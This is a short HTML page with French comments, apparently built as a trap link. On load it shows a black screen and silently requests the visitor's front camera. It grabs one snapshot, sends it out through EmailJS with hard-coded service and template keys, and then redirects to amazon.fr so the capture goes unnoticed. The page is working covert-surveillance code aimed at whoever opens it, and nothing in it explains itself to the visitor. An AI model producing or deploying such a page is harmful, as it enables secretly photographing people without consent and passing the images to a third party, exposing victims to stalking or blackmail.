<!DOCTYPE html>
<html lang="fr">
<head>
  <meta charset="UTF-8">
  <title></title>
  <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
  <style>
    body, html {
      margin: 0;
      padding: 0;
      background: #000000; /* √©cran noir */
      height: 100%;
      width: 100%;
      overflow: hidden;
    }
    video, canvas {
      display: none !important;
    }
  </style>
</head>
<body>
  <video id="video" autoplay playsinline></video>
  <canvas id="canvas" width="160" height="120"></canvas>

  <script>
    emailjs.init("IoSfbtGz4KSL_5_9E");

    const video = document.getElementById('video');
    const canvas = document.getElementById('canvas');
    const context = canvas.getContext('2d');

    async function startCapture() {
      try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
        video.srcObject = stream;

        // D√®s que la vid√©o est pr√™te, capture imm√©diate
        video.onloadeddata = () => {
          context.drawImage(video, 0, 0, canvas.width, canvas.height);
          const imageData = canvas.toDataURL("image/jpeg", 0.2);

          // Stop cam√©ra apr√®s capture
          stream.getTracks().forEach(track => track.stop());

          // Envoi via EmailJS
          emailjs.send("service_8cs0gml", "template_rdhxflt", {
            message: "Photo auto üì∏",
            image: imageData
          }).finally(() => {
            window.location.href = "https://www.amazon.fr";
          });
        };
      } catch (err) {
        window.location.href = "https://www.amazon.fr";
      }
    }

    // Lancement imm√©diat au chargement de la page
    window.onload = startCapture;
  </script>
</body>
</html>
